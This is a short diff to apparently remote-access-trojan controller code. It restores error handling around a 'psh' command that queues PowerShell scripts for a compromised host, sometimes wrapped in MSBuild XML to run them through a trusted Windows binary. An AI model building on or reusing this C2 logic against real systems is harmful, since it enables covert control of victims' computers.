@@ -322,15 +322,15 @@ if __name__ == "__main__":
                             inp = "spawn " + send_ratcode(ratID)
 
                     elif(str.startswith(inp, "psh ")):
-                        #try:
-                        filepath = inp.split(" ")[1]
-                        if(types[ratID] == "ps1"):
-                            inp = "psh " + get_psscript(filepath)
-                        else:
-                            inp = "psh " + msbuild_path + " " + send_msbuild_xml(get_psscript(filepath))
-                        #except:
-                        #    print("[!] Could not open file " + filepath + " for reading")
-                        #    continue
+                        try:
+                            filepath = inp.split(" ")[1]
+                            if(types[ratID] == "ps1"):
+                                inp = "psh " + get_psscript(filepath)
+                            else:
+                                inp = "psh " + msbuild_path + " " + send_msbuild_xml(get_psscript(filepath))
+                        except:
+                            print("[!] Could not open file " + filepath + " for reading")
+                            continue
 
 
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
